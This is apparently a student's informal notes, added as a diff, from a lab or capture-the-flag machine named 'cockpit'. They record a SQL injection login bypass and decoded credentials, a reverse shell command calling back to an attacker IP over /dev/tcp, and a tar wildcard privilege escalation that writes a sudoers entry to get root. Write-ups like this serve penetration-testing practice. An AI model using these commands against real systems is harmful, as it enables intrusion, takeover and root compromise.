@@ -1,0 +1,48 @@
+cockpit 
+192.168.221.10
+
+dirb (no luck)
+nikto -h http://192.168.221.10
+find login page 
+login.php
+tried default username and password  but failed
+use single qutation find useful information 
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND password like '%%'' at line 1
+
+vulnerable for sql injectiion 
+I got blocked 
+You have been blocked due to an illegal activity and this incident will be reported.
+I am not sure how long I will be blocked
+I put the username 'admin' without password and logged in 
+I cant blieve 
+Second method user 'OR '' = ' to login
+
+Got username and password (base 64 encoding)
+https://www.base64decode.org/
+james:canttouchhhthiss@455152
+cameron:thisscanttbetouchedd@455152
+
+login https://192.168.221.10:9090/ using james
+
+in terminal I run 
+sudo -l
+and its Sudo
+I have limitation in this shell so I haved decided to get revers shell 
+sh -i >& /dev/tcp/192.168.45.173/4545 0>&1
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+I found privilege esclation using tar on https://gtfobins.github.io/gtfobins/tar/#sudo
+but failed 
+reason wildcard 
+SO I searched online 'tar wildcard privilege escalation'
+
+https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
+
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh privesc.sh'
+echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" >privesc.sh
+
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
+
+got root shell
